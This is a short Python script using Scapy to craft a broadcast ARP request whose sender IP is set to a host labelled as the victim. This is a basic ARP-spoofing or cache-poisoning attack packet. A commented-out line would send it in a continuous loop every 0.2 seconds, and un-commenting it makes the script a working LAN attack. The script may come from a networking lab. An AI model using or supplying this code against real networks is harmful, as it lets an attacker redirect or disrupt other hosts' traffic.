## Import Scapy module
from scapy.all import *


packet = Ether()/ARP()
packet.op = 1 #request
packet.psrc="192.168.0.100" #victim
packet.hwdst="ff:ff:ff:ff:ff:ff" # all victims
packet.pdst = "255.255.255.255" # all victims
packet.dst = "ff:ff:ff:ff:ff:ff" # all victims

#sendp(packet, loop =1, inter = .2)

packet.show()
